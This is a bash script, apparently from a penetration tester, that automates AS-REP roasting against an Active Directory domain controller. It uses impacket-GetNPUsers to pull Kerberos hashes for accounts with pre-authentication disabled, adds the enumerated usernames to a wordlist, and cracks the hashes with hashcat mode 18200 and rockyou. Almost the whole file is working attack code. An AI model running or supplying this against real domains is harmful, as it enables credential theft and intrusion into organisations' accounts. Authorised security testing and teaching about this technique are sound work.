# A bash script to automate brute forcing AS-REP accounts from domain controllers.
# Created after testing a network where the DC was external facing and we could brute force AS-REP roastable accounts pre-auth.
# Compile your usersfile and begin.
# Developed using Impacket Version 0.11.0
# Usage: ./asrep-roaster.sh <domain> <dc> <usersfile>
# Example: ./asrep-roaster.sh megacorp.local 10.10.10.10 /usr/share/wordlists/users.txt /home/adversary/target/asrep-roaster.txt

# Let's define the variables

domain=$1
dc=$2
usersfile=$3

# If the user does not use correct syntax, print the usage and exit.

if [ -z "$domain" ] || [ -z "$dc" ] || [ -z "$usersfile" ]; then
    echo "Please review usage guide and try again."
    echo "Usage: ./asrep-roaster.sh <domain> <dc> <usersfile>"
    echo "Example: ./asrep-roaster.sh example.com 10.10.10.1 /usr/share/wordlists/users.txt" 
    echo "Exiting..."
    exit 1
fi

# First, let's run impacket-GetNPUsers to enumerate users that have Kerberos pre-authentication disabled.

echo "Enumerating users with Kerberos pre-authentication disabled..."
echo "----------------------------------------"
echo "Thank you, almighty Impacket!"

# We will save the output to a file called hashes.asrep.

impacket-GetNPUsers $domain/ -dc $dc -usersfile $usersfile -format hashcat -outputfile hashes.asrep

# Then append the usernames from the output file to our usersfile.

echo "The following usernames have been enumerated and will be added to $usersfile:"
echo "----------------------------------------"
echo ""

cat hashes.asrep | cut -d'$' -f4 | cut -d'*' -f2
cat hashes.asrep | cut -d'$' -f4 | cut -d'*' -f2 >> $usersfile

echo "... Done!"
echo ""

# Finally, let's crack some hashes.

echo "Let's crack some hashes!"
echo "----------------------------------------"
echo "Using Hashcat with mode 18200 for AS-REP hashes."

hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force --show

echo "----------------------------------------"
echo "All done! Happy hacking!"
echo "If you didn't crack the hashes, try using a different wordlist or rules."
echo "For example: hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"